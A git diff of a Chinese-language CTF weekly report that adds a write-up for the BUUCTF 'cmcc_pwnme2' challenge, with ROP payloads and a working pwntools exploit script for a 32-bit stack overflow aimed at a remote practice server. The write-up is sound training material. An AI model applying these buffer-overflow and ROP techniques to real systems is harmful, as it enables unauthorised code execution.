@@ -108,7 +108,7 @@ shell()
 ```
 
 
-## ciscn_2019_es_7
+## BUUCTF-ciscn_2019_es_7
 程序就调用了两个函数read和write 其中read函数明显存在溢出
 
 <img width="657" alt="image" src="https://github.com/keepinggg/Weekly_Report/assets/62430054/cbdc640b-e59c-4f23-ba3c-2f6c20820a41">
@@ -242,6 +242,80 @@ sl(payload)
 
 shell()
 ```
+
+## BUUCTF-cmcc_pwnme2
+无限制栈溢出
+
+<img width="267" alt="image" src="https://github.com/keepinggg/Weekly_Report/assets/62430054/caef0b84-ef45-46ed-8ba5-f140d183eb9d">
+
+有两个add_home和add_flag函数 只要参数正确即可将flag路径拼接到string字符串中 最后再调用exec_string函数即可打印flag
+
+<img width="426" alt="image" src="https://github.com/keepinggg/Weekly_Report/assets/62430054/4a06efb9-bc69-40a6-b7f6-8c1073216761">
+
+<img width="291" alt="image" src="https://github.com/keepinggg/Weekly_Report/assets/62430054/fcf4e05b-2672-4175-b520-d012d96de943">
+
+由于是32位程序 通过栈传递参数 可以利用pop ret去做ROP
+
+```python
+payload = b'A'*off1 + p32(add_home_addr) + p32(pop_ret) + p32(0xdeadbeef)
+payload+= p32(add_flag_addr) + p32(pop2_ret) + p32(0xCAFEBABE) + p32(0xABADF00D)
+payload+= p32(exec_string)
+```
+
+但本题还有一个更简单的做法 在知道flag的路径后 可以直接通过gets函数去输入string 然后直接执行exec_string
+
+```python
+payload = b'A' * off1 + p32(gets_plt) + p32(exec_string) + p32(string)
+```
+
+### exp_pwnme2.py
+```python
+from pwn import *
+# p = process("./pwnme2")
+p = remote("node4.buuoj.cn",27879)
+context.log_level = 'debug'
+# context.arch = 'amd64'
+# context(os="linux", arch="amd64",log_level = "debug")
+
+r = lambda : p.recv()
+rx = lambda x: p.recv(x)
+ru = lambda x: p.recvuntil(x)
+rud = lambda x: p.recvuntil(x, drop=True)
+s = lambda x: p.send(x)
+sl = lambda x: p.sendline(x)
+sa = lambda x, y: p.sendafter(x, y)
+sla = lambda x, y: p.sendlineafter(x, y)
+shell = lambda : p.interactive()
+
+string = 0x804A060
+add_home_addr = 0x8048644
+add_flag_addr = 0x8048682
+main = 0x80486F8
+exec_string = 0x80485CB
+
+gets_plt = 0x8048440
+pop_ret = 0x08048409
+pop2_ret = 0x0804867f
+
+off1 = 112
+
+# payload = b'A'*off1 + p32(add_home_addr) + p32(pop_ret) + p32(0xdeadbeef)
+# payload+= p32(add_flag_addr) + p32(pop2_ret) + p32(0xCAFEBABE) + p32(0xABADF00D)
+# payload+= p32(exec_string)
+
+payload = b'A' * off1 + p32(gets_plt) + p32(exec_string) + p32(string)
+
+ru("Please input:\n")
+raw_input("Ther")
+sl(payload)
+
+shell()
+```
+
+
+
+
+
 
 
 
